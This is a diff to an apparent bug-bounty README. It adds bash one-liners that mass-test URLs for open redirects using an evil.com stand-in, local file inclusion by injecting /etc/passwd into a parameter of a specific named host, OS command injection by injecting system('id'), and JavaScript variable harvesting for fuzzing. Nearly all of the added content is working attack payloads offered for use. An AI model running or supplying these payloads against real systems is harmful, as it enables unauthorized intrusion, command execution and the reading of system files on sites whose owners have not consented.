@@ -2,8 +2,36 @@
 Earn bug bounty codes very helpful and advanced.
 
 # One-Liners for bug bounty
+MySpecial
 
-###### Thanks to all who create these Awesome One Liners❤️
+
+### Redirects 
+```bash
+cat * | uro | uniq | grep -a -i "=http" | qsreplace "evil.com" | while read -r host; do   response=$(curl -s -L -I "$host" | grep "evil.com");   if [[ ! -z "$response" ]]; then     echo -e "$host \033[0;31mVulnerable\033[0m";     echo "$response";   fi; done
+```
+### LFI
+```bash
+echo "https://staff.edmarker.com/index.php?page=111&f_id=735&target=Right" | \
+sed 's/111/\/etc\/passwd%00/' | \
+while read url; do \
+    curl -s "$url" | grep "root:x:" && echo "$url is vulnerable"; \
+done
+```
+### Os Command Injection
+```
+cat allurls.txt | uro | grep "\?" | sed "s/=./='.system(%27id%27);/" | uniq | while read url; do    curl -s "$url" | grep -i "uid=" && echo "$url is vulnerable to Command Injection";  done
+```
+
+### Special urls
+```
+cat allurls.txt | cat | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
+```
+
+
+
+
+
+###### follow and starts❤️
 ----------------------
 ![image](https://user-images.githubusercontent.com/75373225/180003557-59bf909e-95e5-4b31-b4f8-fc05532f9f7c.png)
 ---------------------------
